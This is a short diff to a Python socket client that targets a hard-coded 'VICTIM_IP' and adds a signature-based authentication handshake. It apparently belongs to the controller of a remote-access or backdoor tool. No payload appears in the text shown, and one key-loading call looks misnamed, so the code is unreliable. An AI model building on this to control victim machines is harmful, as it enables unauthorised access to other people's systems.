@@ -14,6 +14,7 @@ VICTIM_IP = '127.0.0.1'
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 def _authenticate(message = INIT_MESSAGE):
+    auth = False
     with open("privkey.pem", "rb") as key_file:
         priv = serialization.load_pem_priv_key(
             key_file.read(),
@@ -27,6 +28,13 @@ def _authenticate(message = INIT_MESSAGE):
             ),
             hashes.SHA256()
         )
+
+        s.send(signature)
+        s.send(message)
+
+        success = s.recv(4096)
+        auth = success == b'success'
+    return auth
 
 def _connect(host = VICTIM_IP, port = BASE_PORT):
     try:
